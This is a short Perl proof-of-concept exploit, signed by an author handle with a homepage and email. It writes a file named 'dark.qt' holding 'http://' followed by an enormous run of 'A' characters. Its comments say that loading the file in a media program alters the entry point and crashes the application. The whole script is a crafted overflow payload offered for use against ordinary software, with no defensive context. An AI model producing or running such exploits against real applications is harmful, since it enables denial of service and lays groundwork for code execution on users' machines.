#!/usr/bin/perl -w
#By DarkB0X
#HomePage : http://NullArea.Net
#contact : darkb0x97@googlemail.com
#after loading the file click on it in the program
#entry point will change and the app will crash


my $file = "dark.qt" ;
my $poc="http://"."A" x 0265487 ;
open(b0x, ">>$file") or die "Cannot open $file";
print b0x $poc;
close(b0x);
print "\n[+] done ! , $file created";
